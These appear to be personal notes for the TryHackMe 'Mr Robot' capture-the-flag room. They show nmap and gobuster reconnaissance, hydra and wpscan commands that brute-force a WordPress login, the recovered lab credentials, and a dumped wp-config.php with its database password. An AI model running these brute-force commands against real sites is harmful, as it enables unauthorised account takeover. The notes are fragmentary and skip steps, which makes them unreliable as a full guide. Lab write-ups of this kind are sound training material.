https://tryhackme.com/room/mrrobot


##################################
 			Cosmin Tibuleac | 20.12.2021
##################################

export IP=10.10.88.154


# Nmap:

*nmap -sC -sV -Pn -T4 -p- $IP | tee nmap.txt*

Starting Nmap 7.92 ( https://nmap.org ) at 2021-12-20 07:09 EST
Stats: 0:01:40 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 45.34% done; ETC: 07:12 (0:02:01 remaining)
Stats: 0:01:40 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 45.43% done; ETC: 07:12 (0:02:00 remaining)
Stats: 0:02:04 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 58.30% done; ETC: 07:12 (0:01:28 remaining)
Stats: 0:02:04 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 58.45% done; ETC: 07:12 (0:01:27 remaining)
Nmap scan report for 10.10.88.154
Host is up (0.081s latency).
Not shown: 65532 filtered tcp ports (no-response)
PORT    STATE  SERVICE VERSION
22/tcp  closed ssh
80/tcp  closed http
443/tcp closed https

# Gobuster
*gobuster dir -u 10.10.25.140 --wordlist=/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt | tee gobuster.log*

## Robots.txt
The website contains a robots.txt file:

![[Pasted image 20211221050142.png]]

We can download the dictionary file using wget: 

*wget http://10.10.25.140/fsocity.dic *


Since we have found wp-login.php, we can try to find the credentials for it:
The website will tell us whether the user is right or wrong: 

![[Pasted image 20211221050549.png]]

We can use Burp Suite to intercept the request to the website, so we can see the user and password's parameters: 

![[Pasted image 20211221050906.png]]


Now, we can craft a post form brute forcer for hydra: 

We will use the dictonary file provided by **fsociety**:

*hydra -V -L fsocity.dic -p 123 http://10.10.25.140 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=Invalid Username" | tee hydra.log*

We are using "123" as password because we are only interested in finding the username, since WordPress will let us know whether the username tried is right or wrong.

And pretty quickly, hydra has found a valid username: 

![[Pasted image 20211221052822.png]]

Now that we know the username, it's time to obtain the password. "wpscan" can help us with this.

First, since the dictionary list from **fsociety** is really big and contains some duplicates, we can sort it: 

*cat fsocity.dic| sort -u  | uniq > sorted-fsocity.dic*

For wpscan, we can use the following command: 

*wpscan --url http://10.10.25.140 --usernames Elliot --passwords sorted-fsocity.dic -t 100 *

In no time, wpscan will find the password: 

![[Pasted image 20211221074354.png]]

Elliot:ER28-0652



Linux version 3.13.0-55-generic (buildd@brownie) (gcc version 4.8.2 (Ubuntu 4.8.2-19ubuntu1) ) #94-Ubuntu SMP Thu Jun 18 00:27:10 UTC 2015
Distributor ID:	Ubuntu
Description:	Ubuntu 14.04.2 LTS
Release:	14.04
Codename:	trusty



-rwxr-x--- 1 bitnamiftp daemon 3756 Nov 14  2015 /opt/bitnami/apps/wordpress/htdocs/wp-config.php
define('DB_NAME', 'bitnami_wordpress');
define('DB_USER', 'bn_wordpress');
define('DB_PASSWORD', '570fd42948');
define('DB_HOST', 'localhost:3306');
define('WP_SITEURL', 'http://' . $_SERVER['HTTP_HOST'] . '/');
define('WP_HOME', 'http://' . $_SERVER['HTTP_HOST'] . '/');
define('FTP_USER', 'bitnamiftp');
define('FTP_HOST', '127.0.0.1');



SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

59 * * * * bitnami cd /opt/bitnami/stats && ./agent.bin --run -D


abcdefghijklmnopqrstuvwxyz - robot password.
